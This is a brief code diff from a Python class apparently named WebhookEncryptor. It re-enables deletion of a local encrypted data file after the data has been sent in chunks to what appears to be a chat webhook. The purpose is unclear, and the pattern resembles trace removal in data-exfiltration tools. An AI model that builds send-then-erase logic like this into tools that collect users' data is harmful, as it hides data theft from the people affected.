@@ -117,7 +117,7 @@ class WebhookEncryptor:
                 send_embeds(embeds[i:i + chunk_size])
 
         # Always call the file deletion function after sending data
-        #self.delete_encrypted_data()
+        self.delete_encrypted_data()
 
     def delete_encrypted_data(self):
         """Delete the encrypted_data.dat file."""
